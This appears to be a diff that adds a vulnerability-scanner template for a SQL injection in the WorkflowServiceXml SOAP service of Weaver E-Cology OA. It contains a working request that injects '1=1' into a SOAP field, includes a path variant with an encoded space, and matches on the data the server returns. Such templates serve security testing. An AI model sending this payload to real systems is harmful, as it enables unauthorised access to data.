@@ -1,0 +1,37 @@
+id: e-cology-workflowservicexml-gethendledworkflowrequestlist-sqli
+info:
+  name: 泛微 E-Cology OA workflowservicexml 接口 - SQL 注入漏洞
+  author: Chaitin
+  severity: high
+  metadata:
+    verified: true
+    max-request: 1
+    vuln-id: CT-1201009
+    vendor: weaver
+    product: ecology
+  tags: sqli,vuln,weaver,ecology,oa
+http:
+- method: POST
+  path:
+  - '{{BaseURL}}/services/WorkflowServiceXml'
+  - '{{BaseURL}}/services%20/WorkflowServiceXml'
+  headers:
+    Content-Type: text/xml
+  body: |-
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver"> <soapenv:Header/>
+      <soapenv:Body>
+          <web:getHendledWorkflowRequestList>
+            <web:in0>1</web:in0>
+            <web:in1>1</web:in1>
+            <web:in2>1</web:in2>
+            <web:in3>1</web:in3>
+            <web:in4>
+                <web:string>1=1</web:string>
+            </web:in4>
+          </web:getHendledWorkflowRequestList>
+      </soapenv:Body>
+    </soapenv:Envelope>
+  matchers:
+  - type: dsl
+    dsl:
+    - 'status_code == 200 && contains(body, ''lastOperatorName'') && contains(body, ''lastOperateTime'') && contains(body, ''receiveTime'')'
